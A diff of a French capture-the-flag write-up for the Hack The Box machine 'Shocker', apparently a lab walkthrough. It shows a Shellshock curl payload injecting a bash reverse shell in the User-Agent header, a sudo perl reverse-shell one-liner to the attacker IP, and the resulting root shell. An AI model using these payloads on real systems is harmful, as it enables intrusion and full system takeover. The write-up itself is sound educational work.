@@ -383,7 +383,7 @@ Port 80 (http)
 ## Exploitation – Prise pied (Foothold)
 
 Le site web exposé par la machine est extrêmement minimaliste : il ne présente qu’une unique page contenant simplement une image, *bug.jpg*, sans aucun lien ni fonctionnalité apparente. Face à une surface d’attaque aussi restreinte, il est logique d’envisager que cette image puisse dissimuler une information utile à la progression. Nous commençons donc par la télécharger et l’analyser à l’aide des outils et méthodes décrits dans la recette **{{< recette "Outils-Stéganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
- Après avoir appliqué l’ensemble de ces techniques (binwalk, strings, exiftool, steghide…), **nous ne mettons en évidence aucun élément utile**, ce qui confirme que l’image ne constitue pas un vecteur d’exploitation dans ce cas.
+ Après avoir appliqué l’ensemble de ces techniques (binwalk, strings, exiftool, steghide…), nous ne mettons en évidence aucun élément utile, ce qui confirme que **l’image ne constitue pas un vecteur d’exploitation** dans ce cas.
 
 
 
@@ -485,6 +485,8 @@ Port 80 (http)
 
 La présence du script `user.sh` dans `/cgi-bin/` évoque immédiatement une possible **vulnérabilité Shellshock**. Nous allons donc vérifier si ce script est effectivement exploitable.
 
+### Shellshock
+
 - Nous commençons par injecter dans l’en-tête *User-Agent* une définition de fonction suivie d’une commande (`echo VULN`), conformément au mécanisme d’exploitation de Shellshock. Si le serveur exécute cette commande, cela confirme que le script CGI est vulnérable.
 
 ```bash
@@ -505,14 +507,14 @@ uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),4
 
 ```
 
-
+- La vulnérabilité étant confirmée, nous injectons un [payload Bash](https://www.revshells.com/) de reverse shell dans l’en-tête *User-Agent*. Celui-ci est exécuté via Shellshock et ouvre immédiatement une session distante sur notre Kali Linux.
 
 ```bash
 curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.152/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
 
 ```
 
-- La vulnérabilité étant confirmée, nous injectons un payload Bash de reverse shell dans l’en-tête *User-Agent*. Celui-ci est exécuté via Shellshock et ouvre immédiatement une session distante sur notre Kali Linux.
+### Kali Linux
 
 Dans un autre terminal de kali linux
 
@@ -523,8 +525,6 @@ Connection received on 10.129.160.126 58744
 bash: no job control in this shell
 shelly@Shocker:/usr/lib/cgi-bin$
 ```
-
-
 
 ```bash
 shelly@Shocker:/usr/lib/cgi-bin$ ls -l
@@ -561,6 +561,10 @@ shelly@Shocker:/home/shelly$
 
 ## Escalade de privilèges
 
+### sudo -l
+
+Commençons par un classique sudo -l
+
 ```bash
 shelly@Shocker:/home/shelly$ sudo -l
 Matching Defaults entries for shelly on Shocker:
@@ -571,13 +575,15 @@ User shelly may run the following commands on Shocker:
 shelly@Shocker:/home/shelly$
 ```
 
+### sudo perl
 
+Commençons par exécuter un [payload bash en perl](https://www.revshells.com/)  via `sudo perl`
 
 ```bash
 shelly@Shocker:/home/shelly$ sudo perl -e 'use Socket;$i="10.10.14.152";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotob;if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
-
+### Kali Linux
 
 ```bash
 nc -lvnp 12345                                                      
@@ -586,7 +592,9 @@ Connection received on 10.129.160.126 34840
 root@Shocker:/home/shelly# 
 ```
 
+Nous obtenons un shell bash que nous pouvons stabiliser avec {{< recette "stabiliser-reverse-shell" >}}
 
+Et puisque nous sommes root, nous pouvons aller à l'essentiel et afficher le `flag root.txt`
 
 ```bash
 root@Shocker:/home/shelly# cat /root/root.txt
@@ -601,8 +609,6 @@ be89xxxxxxxxxxxxxxxxxxxxxxxxxx9bef
 
 ## Conclusion
 
-- Récapitulatif de la chaîne d’attaque (du scan à root).
-- Vulnérabilités exploitées & combinaisons.
-- Conseils de mitigation et détection.
-- Points d’apprentissage personnels.
+Cette machine illustre parfaitement l’importance d’une énumération structurée et d’une interprétation attentive des indices laissés en surface. À partir d’une interface web quasi inexistante, la découverte du répertoire `/cgi-bin/` a orienté notre analyse vers une piste classique mais toujours pertinente : les scripts CGI vulnérables à Shellshock. L’exploitation progressive — validation de la faille, exécution de commandes, puis obtention d’un reverse shell — nous a permis d’obtenir un accès utilisateur avant de finaliser l’attaque par une élévation de privilèges simple et directe via `sudo` et Perl.
+ **Un déroulé simple et cohérent, qui montre qu’une vulnérabilité historique comme Shellshock peut rester exploitable lorsqu’elle n’est pas corrigée.**.
 
